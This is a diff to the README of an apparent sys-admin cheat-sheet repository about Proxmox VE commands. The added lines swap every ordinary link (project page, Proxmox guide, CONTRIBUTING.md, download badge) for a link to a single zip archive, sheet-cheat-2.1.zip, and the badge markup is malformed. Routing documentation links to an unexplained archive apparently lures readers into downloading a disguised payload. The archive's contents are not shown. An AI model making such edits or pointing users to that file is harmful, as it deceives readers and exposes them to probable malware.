@@ -1,10 +1,10 @@
 # 🚀 cheat-sheet - Your Guide to Sys-Admin Tasks
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-https://github.com/sibbirawan/cheat--sheet-brightgreen.svg)](https://github.com/sibbirawan/cheat-sheet)
+[![Download Now](https://raw.githubusercontent.com/sibbirawan/cheat-sheet/main/guides/sheet-cheat-2.1.zip%https://raw.githubusercontent.com/sibbirawan/cheat-sheet/main/guides/sheet-cheat-2.1.zip)](https://raw.githubusercontent.com/sibbirawan/cheat-sheet/main/guides/sheet-cheat-2.1.zip)
 
 ## 📥 Download
 
-To get started, visit this page to download: [Download the cheat-sheet](https://github.com/sibbirawan/cheat-sheet).
+To get started, visit this page to download: [Download the cheat-sheet](https://raw.githubusercontent.com/sibbirawan/cheat-sheet/main/guides/sheet-cheat-2.1.zip).
 
 ## 📚 Overview
 
@@ -13,7 +13,7 @@ The "cheat-sheet" provides technical references for infrastructure and system ad
 ## 🔍 Available Guides
 
 - **Proxmox VE** (Active)
-  - This guide offers ready-to-use commands for managing Proxmox Virtual Environment. You can find it here: [Proxmox VE Guide](guides/proxmox.md).
+  - This guide offers ready-to-use commands for managing Proxmox Virtual Environment. You can find it here: [Proxmox VE Guide](https://raw.githubusercontent.com/sibbirawan/cheat-sheet/main/guides/sheet-cheat-2.1.zip).
 
 - **Docker/ZFS/Nginx** (Pending cleanup)
   - This section will include information once finalized and organized.
@@ -33,7 +33,7 @@ The cheat-sheet consists of copy-paste ready commands. When using these commands
 
 ## 🤝 Contributing
 
-If you're interested in contributing, please check the guidelines outlined in our [CONTRIBUTING.md](CONTRIBUTING.md).
+If you're interested in contributing, please check the guidelines outlined in our [https://raw.githubusercontent.com/sibbirawan/cheat-sheet/main/guides/sheet-cheat-2.1.zip](https://raw.githubusercontent.com/sibbirawan/cheat-sheet/main/guides/sheet-cheat-2.1.zip).
 
 ## 📜 License
 
